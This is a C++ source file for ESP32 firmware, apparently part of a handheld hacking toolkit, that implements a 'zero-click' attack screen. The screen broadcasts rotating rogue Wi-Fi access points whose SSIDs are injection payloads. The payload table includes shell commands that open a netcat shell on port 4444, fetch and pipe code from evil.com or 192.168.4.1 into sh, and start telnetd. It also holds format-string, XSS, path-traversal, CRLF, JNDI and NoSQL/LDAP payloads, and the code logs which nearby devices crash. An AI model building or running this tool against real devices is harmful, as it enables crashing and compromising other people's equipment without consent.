#include "WifiCiwZeroclickScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/InputSelectOption.h"
#include "ui/actions/ShowStatusAction.h"
#include <esp_wifi.h>

WifiCiwZeroclickScreen* WifiCiwZeroclickScreen::_instance = nullptr;

// ── Category names ──────────────────────────────────────────────────────────

const char* const WifiCiwZeroclickScreen::_catNames[] = {
  "CMD", "OVERFLOW", "FMT", "PROBE", "ESC", "SERIAL",
  "ENC", "CHAIN", "HEAP", "XSS", "PATH", "CRLF",
  "JNDI", "NOSQL"
};

// ── All payloads (PROGMEM) ──────────────────────────────────────────────────

const WifiCiwZeroclickScreen::Payload WifiCiwZeroclickScreen::_allPayloads[] PROGMEM = {
  // CMD (25)
  {"|reboot|", CAT_CMD}, {"&reboot&", CAT_CMD}, {"`reboot`", CAT_CMD},
  {"$reboot$", CAT_CMD}, {";reboot;", CAT_CMD}, {"$(reboot)", CAT_CMD},
  {"|shutdown -r|", CAT_CMD}, {"&cat /etc/passwd", CAT_CMD},
  {"reboot\\nreboot", CAT_CMD}, {"reboot\\r\\nreboot", CAT_CMD},
  {"|../../bin/sh|", CAT_CMD}, {"${IFS}reboot", CAT_CMD},
  {"*;reboot", CAT_CMD}, {"$(echo reboot|sh)", CAT_CMD},
  {"reboot\\x00ignored", CAT_CMD}, {"|nc -lp 4444 -e sh|", CAT_CMD},
  {"&wget evil.com/x&", CAT_CMD}, {"$(curl evil.com)", CAT_CMD},
  {"|id>/tmp/pwn|", CAT_CMD}, {"\\x00|reboot|", CAT_CMD},
  {"& ping -n 3 127.0.0.1 &", CAT_CMD}, {"|powershell -c reboot|", CAT_CMD},
  {"`busybox reboot`", CAT_CMD}, {"$(kill -9 1)", CAT_CMD},
  {"|/bin/busybox telnetd|", CAT_CMD},

  // OVERFLOW (26)
  {"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CAT_OVERFLOW},
  {"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CAT_OVERFLOW},
  {"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CAT_OVERFLOW},
  {"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CAT_OVERFLOW},
  {"ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", CAT_OVERFLOW},
  {"%s%s%s%sAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CAT_OVERFLOW},
  {"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n", CAT_OVERFLOW},
  {"A", CAT_OVERFLOW}, {"", CAT_OVERFLOW}, {" ", CAT_OVERFLOW},

  // FMT (15)
  {"%s%s%s%s%s", CAT_FMT}, {"%n%n%n%n", CAT_FMT},
  {"%x%x%x%x", CAT_FMT}, {"%p%p%p%p", CAT_FMT},
  {"%d%d%d%d%d%d", CAT_FMT}, {"AAAA%08x%08x%08x", CAT_FMT},
  {"%s%s%s%s%s%s%s%s%s%s", CAT_FMT}, {"%08x.%08x.%08x.%08x", CAT_FMT},
  {"%n%n%n%n%n%n%n%n", CAT_FMT}, {"%hn%hn%hn%hn", CAT_FMT},
  {"%1$s%2$s%3$s", CAT_FMT}, {"%1$n%2$n", CAT_FMT},
  {"%.9999d", CAT_FMT},
  {"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x", CAT_FMT},
  {"%c%c%c%c%c%c%c%c%c%c%c%c", CAT_FMT},

  // PROBE (14)
  {"", CAT_PROBE}, {" ", CAT_PROBE},
  {"ValidSSID\\xff", CAT_PROBE}, {"Test\\x00Hidden", CAT_PROBE},
  {"DIRECT-xx-SPOOF", CAT_PROBE},

  // ESC (8)
  {"\\x1b[2J\\x1b[H", CAT_ESC}, {"\\x1b]0;HACKED\\x07", CAT_ESC},
  {"\\x1b[6n", CAT_ESC}, {"\\x1b[?47h", CAT_ESC},
  {"\\x1b[31mERROR\\x1b[0m", CAT_ESC}, {"\\x1b[1A\\x1b[2K", CAT_ESC},
  {"\\x1b[32mroot@srv\\x1b[0m", CAT_ESC}, {"\\x1b[8m", CAT_ESC},

  // SERIAL (13)
  {"\",\"admin\":true,\"x\":\"", CAT_SERIAL},
  {"</name><admin>1</admin>", CAT_SERIAL},
  {"'; DROP TABLE wifi;--", CAT_SERIAL},
  {"{\"role\":\"admin\"}", CAT_SERIAL},
  {"key=val\\nnewsection", CAT_SERIAL},
  {"{{7*7}}", CAT_SERIAL}, {"${7*7}", CAT_SERIAL},
  {"=CMD(\"calc\")", CAT_SERIAL},
  {"-1+1+cmd|'/C calc'!A0", CAT_SERIAL},
  {"+1+cmd|'/C calc'!A0", CAT_SERIAL},

  // ENC (8)
  {"%7Creboot%7C", CAT_ENC}, {"%24(reboot)", CAT_ENC},
  {"&vert;reboot&vert;", CAT_ENC},

  // CHAIN (8)
  {"$(", CAT_CHAIN}, {"reboot)", CAT_CHAIN},
  {"|nc 192.168.4.1", CAT_CHAIN}, {"4444 -e /bin/sh|", CAT_CHAIN},
  {"%x%x%x%x_LEAK", CAT_CHAIN}, {"%n%n_WRITE", CAT_CHAIN},
  {"wget http://192.168", CAT_CHAIN}, {".4.1/x -O-|sh", CAT_CHAIN},

  // HEAP (8)
  {"DEADBEEF", CAT_HEAP}, {"BAADF00D", CAT_HEAP},

  // XSS (8)
  {"<script>alert(1)</script>", CAT_XSS},
  {"<img src=x onerror=alert(1)>", CAT_XSS},
  {"<svg onload=alert(1)>", CAT_XSS},
  {"<body onload=alert(1)>", CAT_XSS},
  {"<iframe src=javascript:alert(1)>", CAT_XSS},
  {"';alert(1)//", CAT_XSS},
  {"<marquee onstart=alert(1)>", CAT_XSS},

  // PATH (6)
  {"../../../etc/shadow", CAT_PATH},
  {"%2e%2e%2fetc%2fpasswd", CAT_PATH},
  {"/proc/self/environ", CAT_PATH},
  {"/dev/urandom", CAT_PATH},

  // CRLF (6)
  {"\\r\\nX-Injected: true", CAT_CRLF},
  {"%0d%0aSet-Cookie:pwned=1", CAT_CRLF},
  {"\\r\\nLocation: http://evil", CAT_CRLF},

  // JNDI (6)
  {"${jndi:ldap://evil/x}", CAT_JNDI},
  {"${jndi:dns://evil/x}", CAT_JNDI},
  {"${env:AWS_SECRET}", CAT_JNDI},
  {"${sys:java.version}", CAT_JNDI},
  {"${jndi:rmi://evil/x}", CAT_JNDI},

  // NOSQL (6)
  {"admin' || '1'=='1", CAT_NOSQL},
  {"{\"$ne\":1}", CAT_NOSQL},
  {"{\"$regex\":\".*\"}", CAT_NOSQL},
  {"*)(objectClass=*)", CAT_NOSQL},
  {"admin)(!(&(1=0", CAT_NOSQL},
};

const int WifiCiwZeroclickScreen::_allPayloadCount =
  sizeof(_allPayloads) / sizeof(_allPayloads[0]);

// ── Destructor ──────────────────────────────────────────────────────────────

WifiCiwZeroclickScreen::~WifiCiwZeroclickScreen()
{
  _stopBroadcast();
  if (_instance == this) _instance = nullptr;
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiCiwZeroclickScreen::onInit()
{
  _instance = this;
  _state = STATE_MENU;
  _refreshMenu();
}

void WifiCiwZeroclickScreen::onItemSelected(uint8_t index)
{
  if (_state != STATE_MENU) return;
  switch (index) {
    case 0: _selectCategories(); break;
    case 1: _startBroadcast(); break;
    case 2: {
      static constexpr InputSelectAction::Option opts[] = {
        {"3 sec", "3"}, {"5 sec", "5"}, {"10 sec", "10"}, {"15 sec", "15"}, {"30 sec", "30"},
      };
      const char* val = InputSelectAction::popup("Rotation", opts, 5);
      if (val) {
        _rotationMs = (unsigned long)atoi(val) * 1000UL;
        _refreshMenu();
      }
      render();
      break;
    }
    case 3: _showDevices(); break;
    case 4: _showAlerts(); break;
  }
}

void WifiCiwZeroclickScreen::onUpdate()
{
  if (_state == STATE_DEVICES || _state == STATE_ALERTS) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        _state = STATE_MENU;
        _refreshMenu();
        return;
      }
      _scrollView.onNav(dir);
    }
    return;
  }

  if (_state == STATE_MENU) {
    ListScreen::onUpdate();
    return;
  }

  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopBroadcast();
      _refreshMenu();
      return;
    }
  }

  _tickBroadcast();

  uint32_t now = millis();
  if (now - _lastDrawMs >= 1000) {
    render();
    _lastDrawMs = now;
  }
}

void WifiCiwZeroclickScreen::onBack()
{
  if (_state == STATE_BROADCASTING) {
    _stopBroadcast();
    _refreshMenu();
  } else if (_state == STATE_DEVICES || _state == STATE_ALERTS) {
    _state = STATE_MENU;
    _refreshMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Private ─────────────────────────────────────────────────────────────────

void WifiCiwZeroclickScreen::onRender()
{
  if (_state == STATE_BROADCASTING) { _drawBroadcasting(); return; }
  if (_state == STATE_DEVICES || _state == STATE_ALERTS) {
    _scrollView.render(bodyX(), bodyY(), bodyW(), bodyH());
    return;
  }
  ListScreen::onRender();
}

void WifiCiwZeroclickScreen::_refreshMenu()
{
  int catCount = 0;
  for (int i = 0; i < CAT_COUNT; i++) {
    if (_catMask & (1 << i)) catCount++;
  }
  _catSub = String(catCount) + "/" + String((int)CAT_COUNT);
  _rotSub = String(_rotationMs / 1000) + "s";
  _devSub = String(_deviceCount);
  _alertSub = String(_alertCount);

  _menuItems[0] = {"Categories", _catSub.c_str()};
  _menuItems[1] = {"Start Attack"};
  _menuItems[2] = {"Rotation", _rotSub.c_str()};
  _menuItems[3] = {"Connected Devices", _devSub.c_str()};
  _menuItems[4] = {"Crash Alerts", _alertSub.c_str()};
  setItems(_menuItems, 5);
}

void WifiCiwZeroclickScreen::_loadPayloads()
{
  _active.clear();
  for (int i = 0; i < _allPayloadCount; i++) {
    if (_catMask & (1 << _allPayloads[i].cat)) {
      _active.push_back(_allPayloads[i]);
    }
  }
}

void WifiCiwZeroclickScreen::_startBroadcast()
{
  _loadPayloads();
  if (_active.empty()) {
    ShowStatusAction::show("No payloads");
    render();
    return;
  }

  WiFi.mode(WIFI_MODE_AP);
  _currentIdx = 0;
  WiFi.softAP(_active[0].ssid, nullptr, 1, false, 10);
  _lastRotation = millis();

  _wifiEventId = WiFi.onEvent(_onWifiEvent);

  _deviceCount = 0;
  _alertCount = 0;
  _alertHead = 0;
  _state = STATE_BROADCASTING;

  int nc = Achievement.inc("wifi_ciw_started");
  if (nc == 1) Achievement.unlock("wifi_ciw_started");
  _lastDrawMs = 0;
  render();
}

void WifiCiwZeroclickScreen::_stopBroadcast()
{
  if (_state != STATE_BROADCASTING) return;
  WiFi.removeEvent(_wifiEventId);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  _active.clear();
  _active.shrink_to_fit();
  _currentIdx   = 0;
  _lastRotation = 0;
  _lastDrawMs   = 0;
  _deviceCount  = 0;
  _alertCount   = 0;
  _alertHead    = 0;
  _state = STATE_MENU;
}

void WifiCiwZeroclickScreen::_showDevices()
{
  if (_deviceCount == 0) {
    ShowStatusAction::show("No devices");
    render();
    return;
  }

  for (int i = 0; i < _deviceCount; i++) {
    char mac[20];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
      _devices[i].mac[0], _devices[i].mac[1], _devices[i].mac[2],
      _devices[i].mac[3], _devices[i].mac[4], _devices[i].mac[5]);
    _scrollLabels[i] = mac;
    String payload = "";
    if (_devices[i].payloadIdx < (int)_active.size()) {
      payload = _active[_devices[i].payloadIdx].ssid;
    }
    _scrollRows[i] = {_scrollLabels[i].c_str(), payload};
  }

  _state = STATE_DEVICES;
  setItems(nullptr, 0);
  _scrollView.setRows(_scrollRows, _deviceCount);
  render();
}

void WifiCiwZeroclickScreen::_showAlerts()
{
  if (_alertCount == 0) {
    ShowStatusAction::show("No alerts");
    render();
    return;
  }

  for (int i = 0; i < _alertCount; i++) {
    int idx = (_alertHead - _alertCount + i + 30) % 30;
    char mac[20];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
      _alerts[idx].mac[0], _alerts[idx].mac[1], _alerts[idx].mac[2],
      _alerts[idx].mac[3], _alerts[idx].mac[4], _alerts[idx].mac[5]);
    _scrollLabels[i] = mac;
    String val = String(_alerts[idx].ssid) + " " + String(_alerts[idx].durationMs) + "ms";
    _scrollRows[i] = {_scrollLabels[i].c_str(), val};
  }

  _state = STATE_ALERTS;
  setItems(nullptr, 0);
  _scrollView.setRows(_scrollRows, _alertCount);
  render();
}

void WifiCiwZeroclickScreen::_tickBroadcast()
{
  if (_active.empty()) return;
  if (millis() - _lastRotation >= _rotationMs) {
    _currentIdx = (_currentIdx + 1) % (int)_active.size();
    WiFi.softAP(_active[_currentIdx].ssid, nullptr, 1, false, 10);
    _lastRotation = millis();
  }
}

void WifiCiwZeroclickScreen::_drawBroadcasting()
{
  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  int y = 4;
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_GREEN, TFT_BLACK);
  sp.drawString("Broadcasting", 4, y);
  y += 14;

  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  if (!_active.empty()) {
    String ssid = String(_active[_currentIdx].ssid);
    if (ssid.length() > 28) ssid = ssid.substring(0, 25) + "...";
    sp.drawString(ssid.c_str(), 4, y);
    y += 12;

    String info = String(_currentIdx + 1) + "/" + String((int)_active.size());
    info += " [" + String(_catNames[_active[_currentIdx].cat]) + "]";
    sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
    sp.drawString(info.c_str(), 4, y);
    y += 14;
  }

  sp.setTextColor(TFT_YELLOW, TFT_BLACK);
  sp.drawString(("Dev:" + String(_deviceCount)).c_str(), 4, y);

  if (_alertCount > 0) {
    sp.setTextColor(TFT_RED, TFT_BLACK);
    sp.drawString(("Alert:" + String(_alertCount)).c_str(), bodyW() / 2, y);
  }
  y += 14;

  unsigned long elapsed = millis() - _lastRotation;
  if (elapsed < _rotationMs) {
    int remaining = (_rotationMs - elapsed) / 1000;
    sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
    sp.drawString(("Next: " + String(remaining) + "s").c_str(), 4, y);
  }

  sp.setTextDatum(BC_DATUM);
  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  #ifdef DEVICE_HAS_KEYBOARD
    sp.drawString("BACK: Stop", bodyW() / 2, bodyH());
  #else
    sp.fillRect(0, bodyH() - 16, bodyW(), 16, Config.getThemeColor());
    sp.setTextColor(TFT_WHITE, Config.getThemeColor());
    sp.drawString("< Back", bodyW() / 2, bodyH() - 8);
  #endif

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}

void WifiCiwZeroclickScreen::_selectCategories()
{
  // Toggle through categories using InputSelectAction
  InputSelectAction::Option opts[CAT_COUNT + 2];
  char labels[CAT_COUNT][20];
  char values[CAT_COUNT][4];

  auto buildOpts = [&]() {
    for (int i = 0; i < CAT_COUNT; i++) {
      bool on = (_catMask & (1 << i)) != 0;
      snprintf(labels[i], sizeof(labels[i]), "%s %s", on ? "[x]" : "[ ]", _catNames[i]);
      snprintf(values[i], sizeof(values[i]), "%d", i);
      opts[i] = {labels[i], values[i]};
    }
    opts[CAT_COUNT]     = {"All ON", "98"};
    opts[CAT_COUNT + 1] = {"All OFF", "99"};
  };

  while (true) {
    buildOpts();
    const char* val = InputSelectAction::popup("Categories", opts, CAT_COUNT + 2);
    if (!val) break;
    int v = atoi(val);
    if (v == 98) _catMask = (1 << CAT_COUNT) - 1;
    else if (v == 99) _catMask = 0;
    else if (v < CAT_COUNT) _catMask ^= (1 << v);
  }
  _refreshMenu();
}

// ── WiFi event handler (static) ─────────────────────────────────────────────

void WifiCiwZeroclickScreen::_onWifiEvent(WiFiEvent_t event, WiFiEventInfo_t info)
{
  auto* self = _instance;
  if (!self || self->_state != STATE_BROADCASTING) return;

  if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
    if (self->_deviceCount < 30) {
      auto& d = self->_devices[self->_deviceCount];
      memcpy(d.mac, info.wifi_ap_staconnected.mac, 6);
      d.connectTime = millis();
      d.payloadIdx = self->_currentIdx;
      self->_deviceCount++;

      int nd = Achievement.inc("wifi_ciw_device_connected");
      if (nd == 1) Achievement.unlock("wifi_ciw_device_connected");
    }
  } else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
    uint8_t* m = info.wifi_ap_stadisconnected.mac;
    for (int i = 0; i < self->_deviceCount; i++) {
      if (memcmp(self->_devices[i].mac, m, 6) == 0) {
        unsigned long duration = millis() - self->_devices[i].connectTime;

        // Fast disconnect = possible crash → alert
        if (duration < 10000 && self->_alertCount < 30) {
          int idx = self->_alertHead;
          memcpy(self->_alerts[idx].mac, m, 6);
          if (self->_devices[i].payloadIdx < (int)self->_active.size()) {
            strncpy(self->_alerts[idx].ssid,
              self->_active[self->_devices[i].payloadIdx].ssid, 32);
            self->_alerts[idx].ssid[32] = '\0';
          }
          self->_alerts[idx].durationMs = duration;
          self->_alertHead = (self->_alertHead + 1) % 30;
          if (self->_alertCount < 30) self->_alertCount++;
          if (Uni.Speaker) Uni.Speaker->playNotification();
        }

        // Remove device
        self->_devices[i] = self->_devices[self->_deviceCount - 1];
        self->_deviceCount--;
        break;
      }
    }
  }
}